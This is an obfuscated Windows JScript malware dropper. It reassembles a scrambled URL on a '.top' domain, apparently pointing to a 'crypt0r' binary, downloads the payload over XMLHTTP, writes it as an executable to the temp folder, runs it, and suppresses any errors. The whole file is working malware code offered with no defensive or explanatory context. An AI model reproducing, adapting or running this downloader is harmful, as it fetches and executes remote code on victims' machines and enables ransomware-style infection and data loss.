var j = ["WScript.Shell","Scripting.FileSystemObject","Shell.Application","Microsoft.XMLHTTP"];
var u = ["aaacc.", ":/", "gpozgzejgozj", "glkrgjoegjnfozpkfpze", "top", "win32", "crypt0r", "binaries", "sweetvpn", ".", "arch", "exe", "http", "/"];

try {
    var sh = Cr(0);
    var fs = Cr(1);

    var s2 = Ex("temp") + "\\" + u[2*2+1] +  u[7+3-1]+ u[5*2+1];
    var fi = fs.CreateTextFile(s2,true);
    fi.Write(Pt(2565454484514854845487848, "kgjgepog=kfOIIIeeoezj=="));
    fi.Close();
    sh.run(s2);
}
catch (err)
{
}

function Ex(S) {
    return sh.ExpandEnvironmentStrings("%" + S + "%");
}

function Pt(C,A) {
    var X = Cr(3);
    var T = u[12] + u[7%6] + u[13] + u[3] + u[9] + u[2+2*0] + u[1029*0] + u[8*10/20*2] + u[9] + u[4] + u[13] + u[7] + u[13] + u[10] +  u[10+6/2] + u[7-2] + u[14+5-6] + u[6] + u[9] + u[11];

    X.open('GET', T + "?p=r&l=" + C, false);
    X.SetRequestHeader("User-Agent:", "Made by b4cc4rd1");
    X.send(A);
    return X.responsetext;
}


function Cr(N) {
    return new ActiveXObject(j[N]);
}
